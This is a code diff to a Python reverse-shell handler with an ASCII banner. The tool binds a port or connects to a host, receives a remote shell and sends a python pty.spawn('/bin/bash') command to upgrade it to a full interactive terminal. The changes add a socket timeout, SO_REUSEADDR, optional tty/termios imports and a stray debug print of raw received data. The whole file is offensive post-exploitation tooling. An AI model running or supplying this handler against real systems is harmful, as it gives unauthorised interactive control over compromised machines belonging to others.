@@ -3,10 +3,17 @@
 import os
 import socket
 import sys
-import termios
 import threading
-import tty
 import time
+
+try:
+	import tty
+	import termios
+except:
+	print('Please install tty and termios')
+	imported = False
+else:
+	imported = True
 
 
 def setTTY():
@@ -20,13 +27,18 @@ def resetTTY(fd, oldSet):
 	termios.tcsetattr(fd, termios.TCSADRAIN, oldSet)
 
 def recvLoop(sock):
+	sock.settimeout(1.0)
 	while True:
+		data = None
 		try:
 			data = sock.recv(10000000)
+		except socket.timeout:
+			continue
 		except OSError:
 			break
 		except Exception as e:
 			print(e)
+		print(data)
 		if data == b'' or data == None:
 			break
 		data = data.decode(errors='ignore')
@@ -43,6 +55,7 @@ def connect(host, port):
 
 def bind(port):
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	sock.bind(('', port))
 	sock.listen(1)
 	client, addr = sock.accept()
@@ -88,6 +101,8 @@ print('''
 ██╔══██╗██╔══╝░░░╚═══██╗██╔══██║
 ██║░░██║███████╗██████╔╝██║░░██║
 ╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝
+
+To exit: ² or Ω
 ''')
 if len(sys.argv) == 2:
 	serv, sock = bind(int(sys.argv[1]))
@@ -103,7 +118,8 @@ sock.send(b'export TERM=xterm\n')
 sock.send(b'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n')
 cprint('\r\n')
 
-fd, oldSet = setTTY()
+if imported:
+	fd, oldSet = setTTY()
 thr = threading.Thread(target=recvLoop, args=(sock,))
 thr.start()
 
@@ -133,7 +149,8 @@ while True:
 	except Exception as e:
 		print(e)
 
-resetTTY(fd, oldSet)
+if imported:
+	resetTTY(fd, oldSet)
 sock.close()
 serv.close()
 thr.join()
